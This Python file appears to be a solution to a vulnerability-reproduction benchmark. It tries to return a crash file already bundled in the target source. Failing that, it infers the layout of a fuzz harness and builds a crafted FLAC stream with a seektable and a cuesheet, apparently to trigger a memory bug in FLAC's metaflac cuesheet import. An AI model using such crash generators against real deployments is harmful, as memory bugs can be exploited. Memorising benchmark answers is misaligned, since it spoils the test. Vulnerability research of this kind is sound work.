import os
import re
import tarfile
import tempfile
from typing import Optional, Tuple, List


def _is_within_directory(directory: str, target: str) -> bool:
    abs_directory = os.path.abspath(directory)
    abs_target = os.path.abspath(target)
    return os.path.commonpath([abs_directory]) == os.path.commonpath([abs_directory, abs_target])


def _safe_extract_tar(tar: tarfile.TarFile, path: str) -> None:
    for member in tar.getmembers():
        member_path = os.path.join(path, member.name)
        if not _is_within_directory(path, member_path):
            continue
        try:
            tar.extract(member, path=path, set_attrs=False)
        except Exception:
            pass


def _unpack_src(src_path: str) -> str:
    if os.path.isdir(src_path):
        return src_path
    tmp = tempfile.mkdtemp(prefix="arvo_src_")
    try:
        with tarfile.open(src_path, mode="r:*") as tar:
            _safe_extract_tar(tar, tmp)
    except Exception:
        return tmp
    return tmp


def _read_file_bytes(path: str, max_bytes: int = 1 << 20) -> Optional[bytes]:
    try:
        st = os.stat(path)
        if st.st_size <= 0 or st.st_size > max_bytes:
            return None
        with open(path, "rb") as f:
            return f.read()
    except Exception:
        return None


def _read_file_text(path: str, max_bytes: int = 1 << 20) -> Optional[str]:
    b = _read_file_bytes(path, max_bytes=max_bytes)
    if b is None:
        return None
    try:
        return b.decode("utf-8", errors="ignore")
    except Exception:
        return None


def _find_existing_poc(root: str) -> Optional[bytes]:
    keywords = ("clusterfuzz", "testcase", "minimized", "crash", "poc", "repro", "uaf", "asan", "oss-fuzz", "fuzz")
    candidates: List[Tuple[int, int, str]] = []
    for dirpath, _, filenames in os.walk(root):
        for fn in filenames:
            p = os.path.join(dirpath, fn)
            try:
                st = os.stat(p)
            except Exception:
                continue
            if not os.path.isfile(p):
                continue
            if st.st_size <= 0 or st.st_size > 65536:
                continue
            lfn = fn.lower()
            lp = p.lower()
            score = 0
            for kw in keywords:
                if kw in lfn or kw in lp:
                    score += 40
            if any(lfn.endswith(ext) for ext in (".bin", ".dat", ".raw", ".input", ".fuzz", ".poc", ".crash", ".testcase", ".cue", ".flac")):
                score += 20
            data = None
            if st.st_size <= 4096:
                data = _read_file_bytes(p, max_bytes=4096)
                if data is not None:
                    if data.startswith(b"fLaC"):
                        score += 30
                    if b"TRACK" in data or b"FILE" in data or b"INDEX" in data:
                        score += 10
            if score > 0:
                candidates.append((score, st.st_size, p))
    if not candidates:
        return None
    candidates.sort(key=lambda t: (-t[0], t[1], t[2]))
    best = candidates[0][2]
    return _read_file_bytes(best, max_bytes=1 << 20)


def _find_harness_source(root: str) -> Optional[str]:
    candidates: List[Tuple[int, int, str]] = []
    for dirpath, _, filenames in os.walk(root):
        for fn in filenames:
            lfn = fn.lower()
            if not any(lfn.endswith(ext) for ext in (".c", ".cc", ".cpp", ".cxx")):
                continue
            p = os.path.join(dirpath, fn)
            try:
                st = os.stat(p)
                if st.st_size <= 0 or st.st_size > 2_500_000:
                    continue
            except Exception:
                continue
            txt = _read_file_text(p, max_bytes=2_500_000)
            if not txt:
                continue
            if "LLVMFuzzerTestOneInput" not in txt and "AFL" not in txt and "fuzz" not in p.lower():
                continue
            score = 0
            if "LLVMFuzzerTestOneInput" in txt:
                score += 80
            ltxt = txt.lower()
            if "cuesheet" in ltxt:
                score += 60
            if "import-cuesheet" in ltxt or "import_cuesheet" in ltxt:
                score += 60
            if "metaflac" in ltxt:
                score += 50
            if "FuzzedDataProvider" in txt:
                score += 20
            if score > 0:
                candidates.append((score, st.st_size, p))
    if not candidates:
        return None
    candidates.sort(key=lambda t: (-t[0], t[1], t[2]))
    return candidates[0][2]


def _type_nbytes(typ: str) -> int:
    t = typ.strip()
    t = t.replace("const", "").replace("unsigned", "uint").strip()
    t = re.sub(r"\s+", "", t)
    t = t.replace("std::", "")
    if t in ("uint8_t", "char", "int8_t", "unsignedchar"):
        return 1
    if t in ("uint16_t", "short", "int16_t"):
        return 2
    if t in ("uint32_t", "int", "int32_t", "unsignedint"):
        return 4
    if t in ("uint64_t", "longlong", "int64_t", "unsignedlonglong"):
        return 8
    if t in ("size_t",):
        return 8
    return 8


def _pack_int(value: int, nbytes: int, endian: str = "little") -> bytes:
    value = int(value) & ((1 << (8 * nbytes)) - 1)
    return value.to_bytes(nbytes, endian, signed=False)


def _infer_split_format(harness_text: str) -> Tuple[str, int, int, str]:
    """
    Returns (mode, nbytes1, nbytes2, endian)
      mode:
        - 'manual1': one length then flac then rest cuesheet
        - 'manual2': two lengths then flac then cuesheet
        - 'provider1': one ConsumeIntegral length then ConsumeBytes flac then remaining cuesheet
        - 'provider2': two lengths then flac then cuesheet
    """
    txt = harness_text
    ltxt = txt.lower()
    endian = "little"
    if "ntohl" in txt or "be32toh" in txt or "ReadBE" in txt or "readbe" in txt or "<<24" in txt:
        endian = "big"

    if "FuzzedDataProvider" in txt:
        # Heuristic: detect two-size consumption
        has_cue_size = ("cuesheet_size" in ltxt) or ("cue_size" in ltxt) or ("cuesize" in ltxt)
        # try to infer type used for flac_size integral
        n1 = 8
        n2 = 8

        m = re.search(r"ConsumeIntegralInRange<\s*([^>]+)\s*>\s*\(", txt)
        if m:
            n1 = _type_nbytes(m.group(1))
        else:
            m = re.search(r"ConsumeIntegral<\s*([^>]+)\s*>\s*\(", txt)
            if m:
                n1 = _type_nbytes(m.group(1))

        # If we can find a second integral consumption, use same type unless another is detected
        ints = re.findall(r"ConsumeIntegralInRange<\s*([^>]+)\s*>", txt)
        if len(ints) >= 2:
            n1 = _type_nbytes(ints[0])
            n2 = _type_nbytes(ints[1])
        elif len(ints) == 1:
            n2 = n1
        else:
            ints2 = re.findall(r"ConsumeIntegral<\s*([^>]+)\s*>", txt)
            if len(ints2) >= 2:
                n1 = _type_nbytes(ints2[0])
                n2 = _type_nbytes(ints2[1])
            elif len(ints2) == 1:
                n2 = n1

        return ("provider2" if has_cue_size else "provider1", n1, n2, endian)

    # Manual parsing
    # Guess size type by presence of uint32_t/size_t in context near "size"
    n1 = 4
    n2 = 4
    if "size_t" in txt and ("flac_size" in ltxt or "filesize" in ltxt or "flacsize" in ltxt):
        n1 = 8
        n2 = 8
    if "uint16_t" in txt and ("flac_size" in ltxt or "size" in ltxt):
        # rare
        n1 = 2
        n2 = 2
    if "uint64_t" in txt and ("flac_size" in ltxt or "size" in ltxt):
        n1 = 8
        n2 = 8
    if "uint32_t" in txt and ("flac_size" in ltxt or "size" in ltxt):
        n1 = 4
        n2 = 4

    has_two = ("cuesheet_size" in ltxt) or ("cue_size" in ltxt) or ("cuesize" in ltxt)
    return ("manual2" if has_two else "manual1", n1, n2, endian)


def _make_min_flac_with_seektable() -> bytes:
    # STREAMINFO
    min_bs = 4096
    max_bs = 4096
    min_fs = 0
    max_fs = 0
    sample_rate = 44100
    channels = 2
    bps = 16
    total_samples = 1_000_000

    streaminfo = bytearray()
    streaminfo += min_bs.to_bytes(2, "big")
    streaminfo += max_bs.to_bytes(2, "big")
    streaminfo += min_fs.to_bytes(3, "big")
    streaminfo += max_fs.to_bytes(3, "big")
    packed = ((sample_rate & ((1 << 20) - 1)) << 44) | ((channels - 1) << 41) | ((bps - 1) << 36) | (total_samples & ((1 << 36) - 1))
    streaminfo += packed.to_bytes(8, "big")
    streaminfo += b"\x00" * 16
    assert len(streaminfo) == 34

    # Metadata headers
    streaminfo_hdr = bytes([0x00, 0x00, 0x00, 0x22])  # not last, type 0, length 34
    # SEEKTABLE with 1 point, last
    seektable_hdr = bytes([0x83, 0x00, 0x00, 0x12])  # last, type 3, length 18
    seekpoint = bytearray()
    seekpoint += (0).to_bytes(8, "big")      # sample_number
    seekpoint += (0).to_bytes(8, "big")      # stream_offset
    seekpoint += (4096).to_bytes(2, "big")   # frame_samples
    assert len(seekpoint) == 18

    flac = bytearray()
    flac += b"fLaC"
    flac += streaminfo_hdr
    flac += streaminfo
    flac += seektable_hdr
    flac += seekpoint
    return bytes(flac)


def _make_cuesheet_text() -> bytes:
    # Three seekpoint-worthy indices
    cue = (
        'FILE "a" WAVE\n'
        "TRACK 01 AUDIO\n"
        "INDEX 01 00:00:00\n"
        "TRACK 02 AUDIO\n"
        "INDEX 01 00:00:01\n"
        "TRACK 03 AUDIO\n"
        "INDEX 01 00:00:02\n"
    )
    return cue.encode("ascii", errors="ignore")


class Solution:
    def solve(self, src_path: str) -> bytes:
        root = _unpack_src(src_path)

        existing = _find_existing_poc(root)
        if existing is not None and len(existing) > 0:
            return existing

        harness_path = _find_harness_source(root)
        mode, n1, n2, endian = ("manual1", 4, 4, "little")
        if harness_path:
            txt = _read_file_text(harness_path, max_bytes=2_500_000) or ""
            mode, n1, n2, endian = _infer_split_format(txt)

        flac = _make_min_flac_with_seektable()
        cue = _make_cuesheet_text()

        # Default values
        flac_len = len(flac)
        cue_len = len(cue)

        if mode in ("manual2", "provider2"):
            prefix = _pack_int(flac_len, n1, endian=endian) + _pack_int(cue_len, n2, endian=endian)
            return prefix + flac + cue

        prefix = _pack_int(flac_len, n1, endian=endian)
        return prefix + flac + cue